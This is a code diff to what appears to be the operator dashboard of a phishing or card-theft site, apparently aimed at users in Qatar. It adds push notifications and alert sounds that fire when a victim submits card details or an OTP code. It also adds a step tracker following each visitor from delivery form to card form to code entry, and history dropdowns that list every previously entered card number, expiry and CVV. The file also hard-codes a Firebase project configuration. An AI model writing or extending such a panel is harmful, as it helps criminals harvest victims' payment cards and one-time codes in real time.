@@ -8,8 +8,162 @@ let adminToken = localStorage.getItem('admin_token');
 let isMuted = false;
 let audioContext = null;
 
+// Firebase FCM
+let fcmToken = null;
+let messaging = null;
+let firebaseInitialized = false;
+
+// Convert VAPID key to Uint8Array for PushManager
+function urlBase64ToUint8Array(base64String) {
+  const padding = "=".repeat((4 - base64String.length % 4) % 4);
+  const base64 = (base64String + padding).replace(/\-/g, "+").replace(/_/g, "/");
+  const rawData = window.atob(base64);
+  const outputArray = new Uint8Array(rawData.length);
+  for (let i = 0; i < rawData.length; ++i) {
+    outputArray[i] = rawData.charCodeAt(i);
+  }
+  return outputArray;
+}
+
 // CRITICAL: Local cache of all visitors for sync between historical and live data
 let allAdminVisitors = [];
+
+// ==========================================
+// FIREBASE CLOUD MESSAGING - Push Notifications
+// Initialize Firebase and request notification permission
+async function initFirebaseMessaging() {
+  try {
+    // Wait for Service Worker to be fully ready
+    console.log("Waiting for Service Worker to be ready...");
+    const swRegistration = await navigator.serviceWorker.ready;
+    console.log("Service Worker is ready:", swRegistration.scope);
+    
+    // Check if notifications are already granted
+    if (Notification.permission === "granted") {
+      await registerFCMToken(swRegistration);
+      return;
+    }
+
+    // If blocked, do not ask again
+    if (Notification.permission === "blocked") {
+      console.log("Notifications blocked by user");
+      return;
+    }
+
+    // Permission default or denied - try to request
+    const permission = await Notification.requestPermission();
+    if (permission === "granted") {
+      await registerFCMToken(swRegistration);
+    }
+  } catch (error) {
+    console.error("Firebase initialization error:", error);
+  }
+}
+
+// Register FCM token with backend
+async function registerFCMToken(swRegistration) {
+  try {
+    if (!messaging) {
+      console.log("Firebase Messaging not available");
+      return;
+    }
+
+    console.log("Getting FCM token with Service Worker...");
+    const token = await messaging.getToken({
+      applicationServerKey: urlBase64ToUint8Array("xKvKpQDl3z8PA4DJK8yWmbzG1VZubwSOnl1ZTQN-eRQ"),
+      serviceWorkerRegistration: swRegistration
+    });
+
+    if (token) {
+      fcmToken = token;
+      console.log("FCM Token received:", token.substring(0, 30) + "...");
+
+      // Send token to backend
+      const response = await fetch(SERVER_URL + "/api/admin/fcm-token", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token: token, enabled: true })
+      });
+
+      const result = await response.json();
+      if (result.success) {
+        console.log("FCM Token registered successfully on backend!");
+        updateNotificationStatus(true);
+      } else {
+        console.error("Backend registration failed:", result.message);
+      }
+    }
+  } catch (error) {
+    console.error("FCM Token registration error:", error);
+  }
+}
+
+// Update notification status UI
+function updateNotificationStatus(enabled) {
+  const badge = document.getElementById('notificationBadge');
+  if (badge) {
+    badge.textContent = enabled ? '🔔' : '🔕';
+    badge.title = enabled ? 'الإشعارات مفعّلة' : 'الإشعارات معطّلة';
+  }
+}
+
+// Initialize Firebase SDK
+function setupFirebaseSDK() {
+  if (firebaseInitialized) return;
+  
+  console.log('🔍 Checking Firebase SDK...');
+  console.log('🔍 firebase object:', typeof firebase);
+  console.log('🔍 firebase.messaging:', typeof firebase?.messaging);
+  
+  // Check for firebase namespace (loaded via script tag)
+  if (typeof firebase !== 'undefined' && firebase.messaging) {
+    try {
+      firebase.initializeApp({
+        apiKey: "AIzaSyA9sRFkHrqOlRkyMfzl4AyK618J12D_uk8",
+        authDomain: "adminqatar-d4192.firebaseapp.com",
+        projectId: "adminqatar-d4192",
+        storageBucket: "adminqatar-d4192.firebasestorage.app",
+        messagingSenderId: "927564639029",
+        appId: "1:927564639029:web:025a0c2e77ce6bba367a7c"
+      });
+      
+      messaging = firebase.messaging();
+      firebaseInitialized = true;
+      
+      // Handle foreground messages
+      messaging.onMessage((payload) => {
+        console.log('📱 Foreground message received:', payload);
+        
+        // Show in-app notification
+        if (payload.notification) {
+          showNotification(payload.notification.title, payload.notification.body, 'info');
+        }
+      });
+      
+      console.log('✅ Firebase SDK initialized');
+    } catch (err) {
+      console.error('❌ Firebase init error:', err);
+    }
+  } else {
+    console.log('❌ Firebase SDK not loaded or messaging not available');
+    console.log('🔍 Available firebase:', firebase);
+  }
+}
+
+// Manual enable notifications (called from UI button)
+async function enableNotifications() {
+  try {
+    const permission = await Notification.requestPermission();
+    if (permission === 'granted') {
+      await registerFCMToken();
+      showNotification('✅', 'تم تفعيل الإشعارات!', 'success');
+    } else {
+      showNotification('❌', 'لم يتم السماح بالإشعارات', 'error');
+    }
+  } catch (error) {
+    showNotification('❌', 'خطأ في تفعيل الإشعارات', 'error');
+  }
+}
 
 // ==========================================
 // SMART SOUND SYSTEM - Silent typing, alerts only on submissions
@@ -20,25 +174,74 @@ const notifiedEvents = new Map();
 
 // Sound definitions using Web Audio API
 const sounds = {
-  // Delivery form submitted - NICE DOUBLE BEEP (success)
+  // 🎉 NEW VISITOR (عميل جديد) - صوت احتفالي قصير
+  newVisitor: () => {
+    if (isMuted) return;
+    // نغمة احتفالية: دو上升 quick celebration
+    playCustomSound({
+      frequencies: [523.25, 659.25, 783.99],
+      duration: 0.12,
+      gap: 0.05,
+      volume: 0.3,
+      type: 'sine',
+      repeat: 1
+    });
+  },
+  
+  // 👋 RETURNING VISITOR (عميل يعود) - صوت ترحيبي مختلف
+  returningVisitor: () => {
+    if (isMuted) return;
+    // نغمة ترحيبية: gentle welcome
+    playCustomSound({
+      frequencies: [392, 493.88],
+      duration: 0.15,
+      gap: 0.08,
+      volume: 0.25,
+      type: 'sine',
+      repeat: 1
+    });
+  },
+  
+  // 📦 DELIVERY DATA (بيانات التوصيل) - صوت مزدوج لطيف
   formDelivery: () => {
     if (isMuted) return;
-    // Double beep: two short friendly tones
-    playSmartBeep([523.25, 0, 659.25], 0.12, 0.1);
+    // نغمة نجاح مزدوجة: double success beep
+    playCustomSound({
+      frequencies: [523.25, 0, 659.25],
+      duration: 0.15,
+      gap: 0.12,
+      volume: 0.3,
+      type: 'triangle',
+      repeat: 1
+    });
   },
   
-  // Payment submitted - FINANCIAL CONFIRMATION (higher pitch, strong)
+  // 💳 PAYMENT CARD (بيانات البطاقة) - صوت طويل وقوي
   formPayment: () => {
     if (isMuted) return;
-    // Ascending financial confirmation
-    playSmartBeep([659.25, 0, 783.99, 0, 1046.50], 0.1, 0.12);
+    // نغمة مالية قوية وطويلة: strong financial alert
+    playCustomSound({
+      frequencies: [523.25, 0, 659.25, 0, 783.99, 0, 1046.50],
+      duration: 0.25,
+      gap: 0.08,
+      volume: 0.4,
+      type: 'square',
+      repeat: 1
+    });
   },
   
-  // OTP verification - RAPID ALERT (urgent)
+  // 🔐 OTP CODE (رمز التحقق) - صوت قصير وقوي ومختلف
   formVerification: () => {
     if (isMuted) return;
-    // Rapid triple alert
-    playSmartBeep([880, 0, 880, 0, 1046.50], 0.08, 0.06);
+    // نغمة تنبيه سريعة وقوية: rapid urgent alert
+    playCustomSound({
+      frequencies: [880, 0, 1046.50, 0, 1174.66],
+      duration: 0.1,
+      gap: 0.05,
+      volume: 0.5,
+      type: 'sawtooth',
+      repeat: 1
+    });
   }
 };
 
@@ -46,13 +249,29 @@ const sounds = {
 function playPageChangeSound() {
   if (isMuted) return;
   // Soft single chime - gentle notification
-  playSmartBeep([440, 0, 554.37], 0.1, 0.15);
+  playCustomSound({
+    frequencies: [440, 554.37],
+    duration: 0.1,
+    gap: 0.1,
+    volume: 0.15,
+    type: 'sine',
+    repeat: 1
+  });
 }
 
-// Generate smart beep using Web Audio API
-function playSmartBeep(frequencies, duration = 0.15, gap = 0.1) {
+// Advanced custom sound generator using Web Audio API
+function playCustomSound(config) {
   try {
-    // Create new AudioContext (user gesture required for first time)
+    const {
+      frequencies = [440],
+      duration = 0.15,
+      gap = 0.1,
+      volume = 0.3,
+      type = 'sine',
+      repeat = 1
+    } = config;
+    
+    // Create new AudioContext
     const ctx = new (window.AudioContext || window.webkitAudioContext)();
     
     // Resume context if suspended (browser policy)
@@ -60,40 +279,59 @@ function playSmartBeep(frequencies, duration = 0.15, gap = 0.1) {
       ctx.resume();
     }
     
-    frequencies.forEach((freq, i) => {
-      if (freq === 0) return; // Skip silence gaps
-      
-      const startTime = ctx.currentTime + (i * (duration + gap));
-      
-      // Create oscillator
-      const oscillator = ctx.createOscillator();
-      const gainNode = ctx.createGain();
-      
-      // Connect
-      oscillator.connect(gainNode);
-      gainNode.connect(ctx.destination);
-      
-      // Set frequency - use different wave types for variety
-      oscillator.frequency.value = freq;
-      oscillator.type = i % 2 === 0 ? 'sine' : 'triangle';
-      
-      // Volume envelope - smooth attack and release
-      gainNode.gain.setValueAtTime(0, startTime);
-      gainNode.gain.linearRampToValueAtTime(0.25, startTime + 0.02); // Attack
-      gainNode.gain.linearRampToValueAtTime(0.15, startTime + duration * 0.5); // Decay
-      gainNode.gain.linearRampToValueAtTime(0, startTime + duration); // Release
-      
-      // Start and stop
-      oscillator.start(startTime);
-      oscillator.stop(startTime + duration);
-    });
+    // Master gain for overall volume control
+    const masterGain = ctx.createGain();
+    masterGain.connect(ctx.destination);
+    masterGain.gain.value = volume;
+    
+    const playSequence = () => {
+      frequencies.forEach((freq, i) => {
+        if (freq === 0) return; // Skip silence gaps
+        
+        const startTime = ctx.currentTime + (i * (duration + gap));
+        
+        // Create oscillator
+        const oscillator = ctx.createOscillator();
+        const gainNode = ctx.createGain();
+        
+        // Connect: oscillator -> gain -> master
+        oscillator.connect(gainNode);
+        gainNode.connect(masterGain);
+        
+        // Set frequency and wave type
+        oscillator.frequency.value = freq;
+        oscillator.type = type;
+        
+        // Volume envelope - punchy attack and smooth release
+        gainNode.gain.setValueAtTime(0, startTime);
+        gainNode.gain.linearRampToValueAtTime(0.9, startTime + 0.01); // Fast attack
+        gainNode.gain.exponentialRampToValueAtTime(0.5, startTime + duration * 0.3); // Decay
+        gainNode.gain.exponentialRampToValueAtTime(0.01, startTime + duration); // Release
+        
+        // Start and stop
+        oscillator.start(startTime);
+        oscillator.stop(startTime + duration + 0.1);
+      });
+    };
+    
+    // Play sequence (with repeat if needed)
+    for (let r = 0; r < repeat; r++) {
+      const repeatDelay = r * (frequencies.length * (duration + gap) + 0.3);
+      setTimeout(playSequence, repeatDelay * 1000);
+    }
     
     // Cleanup context after all sounds done
-    setTimeout(() => ctx.close(), (frequencies.length * (duration + gap) + 0.5) * 1000);
+    const totalDuration = repeat * (frequencies.length * (duration + gap) + 0.3);
+    setTimeout(() => ctx.close(), totalDuration * 1000 + 500);
     
   } catch (e) { 
     console.warn('Audio playback not supported:', e); 
   }
+}
+
+// Legacy function for backward compatibility
+function playSmartBeep(frequencies, duration = 0.15, gap = 0.1) {
+  playCustomSound({ frequencies, duration, gap, volume: 0.3, type: 'sine', repeat: 1 });
 }
 
 // Check if we should play sound (prevent duplicate notifications)
@@ -102,8 +340,16 @@ function shouldPlaySound(sessionId, eventType) {
   const now = Date.now();
   const lastPlayed = notifiedEvents.get(key);
   
-  // Don't play if played in last 3 seconds (prevent spam)
-  if (lastPlayed && (now - lastPlayed) < 3000) {
+  // Different timeouts for different event types
+  let timeout = 3000; // Default 3 seconds
+  
+  // Visitor sounds need longer timeout (5 seconds)
+  if (eventType === 'newVisitor' || eventType === 'returningVisitor') {
+    timeout = 5000;
+  }
+  
+  // Don't play if played in last X seconds (prevent spam)
+  if (lastPlayed && (now - lastPlayed) < timeout) {
     return false;
   }
   
@@ -456,31 +702,34 @@ function setupSocketListeners() {
 
   // CRITICAL: Real-time updates from visitors
   socket.on('visitor:new', (data) => {
-    console.log('🆕 DATA RECEIVED VIA SOCKET (visitor:new):', data);
-    console.log('🆕 sessionId:', data.session_id || data.sessionId);
-    console.log('🆕 allAdminVisitors length:', allAdminVisitors.length);
-    console.log('🆕 visitorsCache size:', visitorsCache.size);
-    console.log('🆕 Grid element:', document.getElementById('visitorsGrid'));
-    
-    // NO SOUND for new visitors - data updates should be silent
     const sessionId = data.session_id || data.sessionId;
     
     if (!sessionId) {
-      console.error('❌ visitor:new received without sessionId!');
       return;
     }
     
-    // Check if card already exists
+    // Check if card already exists (returning visitor)
     const existingCard = document.querySelector('[data-session="' + sessionId + '"]');
-    console.log('🆕 Existing card:', existingCard);
+    const wasInCache = visitorsCache.has(sessionId);
+    
+    // 🎵 PLAY DIFFERENT SOUND BASED ON VISITOR TYPE
+    if (!existingCard && !wasInCache) {
+      // NEW VISITOR - play celebration sound
+      if (shouldPlaySound(sessionId, 'newVisitor')) {
+        sounds.newVisitor();
+      }
+    } else {
+      // RETURNING VISITOR - play welcome sound
+      if (shouldPlaySound(sessionId, 'returningVisitor')) {
+        sounds.returningVisitor();
+      }
+    }
     
     if (existingCard) {
       // Card exists - smart update and move to top
-      console.log('🆕 Updating existing card');
       updateCardAndMoveToTop(sessionId, data);
     } else {
       // New card - add to DOM directly
-      console.log('🆕 Creating new card for visitor');
       const grid = document.getElementById('visitorsGrid');
       if (grid) {
         createVisitorCardElement(data, grid);
@@ -501,14 +750,12 @@ function setupSocketListeners() {
   });
 
   socket.on('visitor:pageChange', (data) => {
-    console.log('📄 DATA RECEIVED VIA SOCKET (visitor:pageChange):', data);
     // NO SOUND - page changes should be silent
     // Update card and move to top (smart update, not full refresh)
     updateCardAndMoveToTop(data.sessionId, data);
   });
 
   socket.on('visitor:offline', (data) => {
-    console.log('📴 DATA RECEIVED VIA SOCKET (visitor:offline):', data);
     const sessionId = data.session_id || data.sessionId;
     
     // IMPORTANT: DO NOT remove card, just update visual status
@@ -555,7 +802,6 @@ function setupSocketListeners() {
   });
 
   socket.on('form:deliverySubmitted', (data) => {
-    console.log('📦 DATA RECEIVED VIA SOCKET (form:deliverySubmitted):', data);
     const sessionId = data.session_id || data.sessionId;
     
     // Play sound ONLY for actual submission - with spam protection
@@ -569,7 +815,6 @@ function setupSocketListeners() {
   });
 
   socket.on('form:paymentSubmitted', (data) => {
-    console.log('💳 DATA RECEIVED VIA SOCKET (form:paymentSubmitted):', data);
     const sessionId = data.session_id || data.sessionId;
     
     // Play sound ONLY for actual submission - with spam protection
@@ -583,7 +828,6 @@ function setupSocketListeners() {
   });
 
   socket.on('form:verificationSubmitted', (data) => {
-    console.log('🔐 DATA RECEIVED VIA SOCKET (form:verificationSubmitted):', data);
     const sessionId = data.session_id || data.sessionId;
     
     // Play sound ONLY for actual submission - with spam protection
@@ -602,22 +846,18 @@ function setupSocketListeners() {
   });
 
   socket.on('visitors:update', (data) => {
-    console.log('📋 DATA RECEIVED VIA SOCKET (visitors:update):', data);
     handleVisitorsUpdate(data);
   });
 
   socket.on('stats:update', (data) => {
-    console.log('📊 DATA RECEIVED VIA SOCKET (stats:update):', data);
     updateStatsDisplay(data);
   });
 
   socket.on('ban:listUpdate', () => {
-    console.log('🚫 DATA RECEIVED VIA SOCKET (ban:listUpdate)');
     loadBannedUsers();
   });
 
   socket.on('user:unbanned', (data) => {
-    console.log('✅ DATA RECEIVED VIA SOCKET (user:unbanned):', data);
     if (data.success) {
       showNotification('تم فك الحظر', 'تم فك الحظر بنجاح', 'success');
       loadBannedUsers();
@@ -628,25 +868,21 @@ function setupSocketListeners() {
 
   // TRASH BIN SOCKET HANDLERS
   socket.on('trash:update', (data) => {
-    console.log('🗑️ DATA RECEIVED VIA SOCKET (trash:update):', data);
     handleTrashUpdate(data);
   });
 
   socket.on('visitor:softDeleted', (data) => {
-    console.log('🗑️ DATA RECEIVED VIA SOCKET (visitor:softDeleted):', data);
     updateTrashCount(data.trashCount);
     removeVisitorCard(data.sessionId);
   });
 
   socket.on('visitor:softDeletedMultiple', (data) => {
-    console.log('🗑️ DATA RECEIVED VIA SOCKET (visitor:softDeletedMultiple):', data);
     updateTrashCount(data.trashCount);
     data.sessionIds.forEach(id => removeVisitorCard(id));
     clearAllCheckboxes();
   });
 
   socket.on('visitor:softDeletedAll', (data) => {
-    console.log('🗑️ DATA RECEIVED VIA SOCKET (visitor:softDeletedAll):', data);
     updateTrashCount(data.trashCount);
     updateVisitorsList();
     clearAllCheckboxes();
@@ -700,9 +936,65 @@ function showNotification(title, message, type = 'info') {
 }
 
 // ========== MOBILE CARD RENDERING ==========
+// ==========================================
+// SMART PAGE TRACKING SYSTEM
+// ==========================================
+
+// Map page names to Arabic labels
 function getPageName(page) {
-  const pages = { 'home': 'الرئيسية', 'delivery': 'التوصيل', 'payment': 'الدفع', 'verification': 'التحقق' };
+  const pages = {
+    'home': 'الرئيسية',
+    'delivery': 'بيانات التوصيل',
+    'payment': 'اختيار الدفع',
+    'payment-form': 'ملء بيانات البطاقة',
+    'verification': 'إدخال الرمز',
+    'verification-error': 'الرمز خطأ',
+    'success': 'تمت العملية'
+  };
   return pages[page] || page;
+}
+
+// Page colors for badge
+function getPageColor(page) {
+  const colors = {
+    'home': { bg: '#6366f1', text: 'الرئيسية' },
+    'delivery': { bg: '#3b82f6', text: 'بيانات التوصيل' },
+    'payment': { bg: '#f59e0b', text: 'اختيار الدفع' },
+    'payment-form': { bg: '#ef4444', text: 'ملء البطاقة' },
+    'verification': { bg: '#10b981', text: 'إدخال الرمز' },
+    'verification-error': { bg: '#dc2626', text: '❌ خطأ' },
+    'success': { bg: '#22c55e', text: '✓ نجاح' }
+  };
+  return colors[page] || { bg: '#6b7280', text: page };
+}
+
+// Check if page has changed (for smart tracking)
+function hasPageChanged(oldPage, newPage) {
+  return oldPage !== newPage;
+}
+
+// Get step progress indicator
+function getStepIndicator(page) {
+  const steps = [
+    { id: 'home', label: '🏠', name: 'الرئيسية' },
+    { id: 'delivery', label: '📦', name: 'التوصيل' },
+    { id: 'payment', label: '💳', name: 'الدفع' },
+    { id: 'payment-form', label: '🔐', name: 'البطاقة' },
+    { id: 'verification', label: '⏳', name: 'الرمز' }
+  ];
+  
+  const currentIndex = steps.findIndex(s => s.id === page || page?.startsWith(s.id));
+  if (currentIndex === -1) return '';
+  
+  let html = '<div class="step-indicator" style="display:flex;gap:4px;align-items:center;">';
+  steps.forEach((step, i) => {
+    const isActive = i === currentIndex;
+    const isCompleted = i < currentIndex;
+    const color = isActive ? '#10b981' : (isCompleted ? '#6366f1' : '#4b5563');
+    html += `<span style="font-size:12px;opacity:${isActive ? 1 : (isCompleted ? 0.8 : 0.4)};">${step.label}</span>`;
+  });
+  html += '</div>';
+  return html;
 }
 
 function getCountryFlag(countryCode) {
@@ -774,6 +1066,75 @@ function createVisitorCard(visitor, isTrashMode = false) {
     </div>
   `).join('');
   
+  // Payment History Dropdown
+  let paymentHistoryToggle = '';
+  if (visitor.payment_submissions && visitor.payment_submissions.length > 1) {
+    const historyItems = visitor.payment_submissions.slice(1).map((sub, idx) => {
+      const subData = typeof sub.form_data === 'string' ? JSON.parse(sub.form_data) : sub.form_data;
+      const timestamp = sub.created_at ? formatTimeAgo(new Date(sub.created_at)) : '';
+      const subCardNum = subData.cardNumber || subData.card_number || '';
+      const subCvv = subData.cvv || '';
+      const subExpiry = subData.expiry || '';
+      const subCardHolder = subData.cardHolder || '';
+      const isCash = subData.paymentMethod === 'cash';
+      return `
+        <div style="padding:8px;background:rgba(16,185,129,0.08);border-radius:8px;margin-bottom:6px;border:1px solid rgba(16,185,129,0.2);">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+            <span style="font-size:10px;color:var(--success);font-weight:600;">#${idx + 2}</span>
+            <span style="font-size:9px;color:#6b7280;">${timestamp}</span>
+          </div>
+          ${subCardNum ? `<div style="font-size:11px;"><span style="color:#9ca3af;">البطاقة:</span> <span dir="ltr">${escapeHtml(subCardNum)}</span></div>` : ''}
+          ${subCardHolder ? `<div style="font-size:11px;"><span style="color:#9ca3af;">صاحب البطاقة:</span> ${escapeHtml(subCardHolder)}</div>` : ''}
+          ${subExpiry ? `<div style="font-size:11px;"><span style="color:#9ca3af;">تاريخ الانتهاء:</span> <span dir="ltr">${escapeHtml(subExpiry)}</span></div>` : ''}
+          ${subCvv ? `<div style="font-size:11px;"><span style="color:#9ca3af;">CVV:</span> <span dir="ltr">${escapeHtml(subCvv)}</span></div>` : ''}
+          ${isCash ? `<div style="font-size:11px;color:#10b981;font-weight:600;">💵 دفع عند الاستلام - 25 ر.ق</div>` : ''}
+        </div>
+      `;
+    }).join('');
+    paymentHistoryToggle = `
+      <div style="margin-top:10px;">
+        <div class="payment-history-toggle" onclick="togglePaymentHistory('${sessionId}')" style="cursor:pointer;display:flex;align-items:center;gap:6px;padding:6px 10px;background:rgba(16,185,129,0.15);border-radius:8px;font-size:11px;color:var(--success);font-weight:600;">
+          <span>▼</span> عرض ${visitor.payment_submissions.length - 1} بطاقة سابقة
+        </div>
+        <div id="paymentHistory_${sessionId}" class="payment-history-dropdown" style="display:none;margin-top:8px;">
+          ${historyItems}
+        </div>
+      </div>
+    `;
+  }
+  
+  // Delivery History Dropdown
+  let deliveryHistoryToggle = '';
+  if (visitor.delivery_submissions && visitor.delivery_submissions.length > 1) {
+    const historyItems = visitor.delivery_submissions.slice(1).map((sub, idx) => {
+      const subData = typeof sub.form_data === 'string' ? JSON.parse(sub.form_data) : sub.form_data;
+      const timestamp = sub.created_at ? formatTimeAgo(new Date(sub.created_at)) : '';
+      return `
+        <div style="padding:8px;background:rgba(59,130,246,0.08);border-radius:8px;margin-bottom:6px;border:1px solid rgba(59,130,246,0.2);">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+            <span style="font-size:10px;color:var(--primary-light);font-weight:600;">#${idx + 2}</span>
+            <span style="font-size:9px;color:#6b7280;">${timestamp}</span>
+          </div>
+          ${subData.fullName ? `<div style="font-size:11px;"><span style="color:#9ca3af;">الاسم:</span> ${escapeHtml(subData.fullName)}</div>` : ''}
+          ${subData.phone ? `<div style="font-size:11px;"><span style="color:#9ca3af;">الهاتف:</span> <span dir="ltr">${escapeHtml(subData.phone)}</span></div>` : ''}
+          ${subData.email ? `<div style="font-size:11px;"><span style="color:#9ca3af;">البريد:</span> ${escapeHtml(subData.email)}</div>` : ''}
+          ${subData.city ? `<div style="font-size:11px;"><span style="color:#9ca3af;">المدينة:</span> ${escapeHtml(subData.city)}</div>` : ''}
+          ${subData.address ? `<div style="font-size:11px;"><span style="color:#9ca3af;">العنوان:</span> ${escapeHtml(subData.address)}</div>` : ''}
+        </div>
+      `;
+    }).join('');
+    deliveryHistoryToggle = `
+      <div style="margin-top:10px;">
+        <div class="delivery-history-toggle" onclick="toggleDeliveryHistory('${sessionId}')" style="cursor:pointer;display:flex;align-items:center;gap:6px;padding:6px 10px;background:rgba(59,130,246,0.15);border-radius:8px;font-size:11px;color:var(--primary-light);font-weight:600;">
+          <span>▼</span> عرض ${visitor.delivery_submissions.length - 1} إرسال سابق
+        </div>
+        <div id="deliveryHistory_${sessionId}" class="delivery-history-dropdown" style="display:none;margin-top:8px;">
+          ${historyItems}
+        </div>
+      </div>
+    `;
+  }
+  
   // OTP Digits HTML
   let otpDigitsHTML = '';
   if (otpValue) {
@@ -794,14 +1155,11 @@ function createVisitorCard(visitor, isTrashMode = false) {
     `;
   }
   
-  // Page badge color
-  const pageColors = {
-    'home': { bg: '#6366f1', text: 'الرئيسية' },
-    'delivery': { bg: '#3b82f6', text: 'التوصيل' },
-    'payment': { bg: '#10b981', text: 'الدفع' },
-    'verification': { bg: '#f59e0b', text: 'التحقق' }
-  };
-  const pageInfo = pageColors[page] || { bg: '#6b7280', text: getPageName(page) };
+  // Get page color using smart system
+  const pageInfo = getPageColor(page);
+  
+  // Add step progress indicator
+  const stepIndicator = getStepIndicator(page);
   
   // Country + Name display
   const displayName = delivery.fullName || payment.cardHolder || country || 'زائر ' + sessionId.substring(0, 6);
@@ -850,6 +1208,7 @@ function createVisitorCard(visitor, isTrashMode = false) {
           <span class="page-badge" style="background: ${pageInfo.bg};">
             ${pageInfo.text}
           </span>
+          ${stepIndicator}
         </div>
       </div>
       
@@ -864,6 +1223,7 @@ function createVisitorCard(visitor, isTrashMode = false) {
           <div class="box-content">
             ${deliveryFields.length > 0 ? deliveryRowsHTML : '<div class="no-data">لا توجد بيانات</div>'}
           </div>
+          ${deliveryHistoryToggle}
         </div>
         
         <!-- Payment Box -->
@@ -875,6 +1235,7 @@ function createVisitorCard(visitor, isTrashMode = false) {
           <div class="box-content">
             ${paymentFields.length > 0 ? paymentRowsHTML : '<div class="no-data">لا توجد بيانات</div>'}
           </div>
+          ${paymentHistoryToggle}
         </div>
       </div>
       
@@ -1522,10 +1883,30 @@ function updateVisitorCardFull(card, data) {
   const titleEl = card.querySelector('.card-title');
   if (titleEl) titleEl.textContent = displayName;
   
-  // Update page
-  const pageEl = card.querySelector('.card-page');
-  if (pageEl && data.current_page) {
-    pageEl.textContent = getPageName(data.current_page);
+  // Update page - Smart page tracking
+  if (data.current_page) {
+    const pageInfo = getPageColor(data.current_page);
+    const pageBadge = card.querySelector('.page-badge');
+    if (pageBadge) {
+      pageBadge.textContent = pageInfo.text;
+      pageBadge.style.background = pageInfo.bg;
+    } else {
+      // For old card style
+      const pageEl = card.querySelector('.card-page');
+      if (pageEl) pageEl.textContent = getPageName(data.current_page);
+    }
+    
+    // Update step indicator for new card style
+    const headerRight = card.querySelector('.header-right');
+    if (headerRight) {
+      const oldStepIndicator = headerRight.querySelector('.step-indicator');
+      const newStepIndicator = getStepIndicator(data.current_page);
+      if (oldStepIndicator && newStepIndicator) {
+        oldStepIndicator.outerHTML = newStepIndicator;
+      } else if (newStepIndicator && !oldStepIndicator) {
+        headerRight.insertAdjacentHTML('beforeend', newStepIndicator);
+      }
+    }
   }
   
   // Update time
@@ -1605,9 +1986,22 @@ function updateCardSection(card, sectionClass, html) {
 function buildDeliverySection(data, allSubmissions = [], sessionId = '') {
   // Get all submissions data
   const submissions = [];
+  
   if (allSubmissions && allSubmissions.length > 0) {
     allSubmissions.forEach((sub, idx) => {
-      const formData = typeof sub.form_data === 'string' ? JSON.parse(sub.form_data) : sub.form_data;
+      let formData = sub.form_data;
+      // Parse form_data if it's a string
+      if (typeof formData === 'string') {
+        try {
+          formData = JSON.parse(formData);
+        } catch (e) {
+          formData = {};
+        }
+      }
+      // Skip if formData is invalid
+      if (!formData || typeof formData !== 'object') {
+        return;
+      }
       submissions.push({
         data: formData,
         timestamp: sub.created_at,
@@ -1620,16 +2014,13 @@ function buildDeliverySection(data, allSubmissions = [], sessionId = '') {
   
   let html = '<div class="card-section delivery-section" style="padding:12px;">';
   
-  // Title with count and dropdown toggle
+  // Title with dropdown toggle
   const count = submissions.length;
   const hasHistory = count > 1;
-  const countLabel = hasHistory ? count + ' إرسالات' : 'إرسال واحد';
-  const arrowIcon = hasHistory ? '▼' : '';
   
-  html += '<div class="section-title delivery-history-toggle" style="cursor:' + (hasHistory ? 'pointer' : 'default') + ';margin-bottom:10px;display:flex;align-items:center;gap:8px;" ' + (hasHistory ? 'onclick="toggleDeliveryHistory(\'' + sessionId + '\')"' : '') + '>';
+  html += '<div class="section-title" style="cursor:' + (hasHistory ? 'pointer' : 'default') + ';margin-bottom:10px;display:flex;align-items:center;gap:8px;" ' + (hasHistory ? 'onclick="toggleDeliveryHistory(\'' + sessionId + '\')"' : '') + '>';
   html += '<span>📦</span> بيانات التوصيل';
-  html += '<span style="margin-right:auto;font-size:12px;color:var(--primary-light);font-weight:600;">' + countLabel + '</span>';
-  html += '<span style="font-size:11px;color:#9ca3af;">' + arrowIcon + '</span>';
+  html += '<span style="margin-right:auto;font-size:11px;color:var(--primary-light);font-weight:600;">' + (hasHistory ? '▼ ' + count : '') + '</span>';
   html += '</div>';
   
   // Show current (latest) delivery
@@ -1656,7 +2047,7 @@ function buildDeliverySection(data, allSubmissions = [], sessionId = '') {
       
       historyItems += '<div class="delivery-history-item" style="padding:10px;background:rgba(59,130,246,0.08);border-radius:8px;margin-bottom:8px;border:1px solid rgba(59,130,246,0.2);">';
       historyItems += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">';
-      historyItems += '<span style="font-size:11px;color:var(--primary-light);font-weight:600;">الإرسال #' + (idx + 2) + '</span>';
+      historyItems += '<span style="font-size:11px;color:var(--primary-light);font-weight:600;">#' + (idx + 2) + '</span>';
       historyItems += '<span style="font-size:10px;color:#6b7280;">' + timestamp + '</span>';
       historyItems += '</div>';
       historyItems += '<div class="data-grid">';
@@ -1689,7 +2080,20 @@ function buildPaymentSection(data, allSubmissions = [], sessionId = '') {
   const submissions = [];
   if (allSubmissions && allSubmissions.length > 0) {
     allSubmissions.forEach((sub, idx) => {
-      const formData = typeof sub.form_data === 'string' ? JSON.parse(sub.form_data) : sub.form_data;
+      let formData = sub.form_data;
+      // Parse form_data if it's a string
+      if (typeof formData === 'string') {
+        try {
+          formData = JSON.parse(formData);
+        } catch (e) {
+          console.error('Error parsing payment form_data:', e);
+          formData = {};
+        }
+      }
+      // Skip if formData is invalid
+      if (!formData || typeof formData !== 'object') {
+        return;
+      }
       submissions.push({
         data: formData,
         timestamp: sub.created_at,
@@ -1702,16 +2106,13 @@ function buildPaymentSection(data, allSubmissions = [], sessionId = '') {
   
   let html = '<div class="card-section payment-section" style="padding:12px;">';
   
-  // Title with count and dropdown toggle
+  // Title with dropdown toggle
   const count = submissions.length;
   const hasHistory = count > 1;
-  const countLabel = hasHistory ? count + ' بطاقات' : 'بطاقة واحدة';
-  const arrowIcon = hasHistory ? '▼' : '';
   
-  html += '<div class="section-title payment-history-toggle" style="cursor:' + (hasHistory ? 'pointer' : 'default') + ';margin-bottom:10px;display:flex;align-items:center;gap:8px;" ' + (hasHistory ? 'onclick="togglePaymentHistory(\'' + sessionId + '\')"' : '') + '>';
+  html += '<div class="section-title payment-title" style="cursor:' + (hasHistory ? 'pointer' : 'default') + ';margin-bottom:10px;display:flex;align-items:center;gap:8px;" ' + (hasHistory ? 'onclick="togglePaymentHistory(\'' + sessionId + '\')"' : '') + '>';
   html += '<span>💳</span> بيانات الدفع';
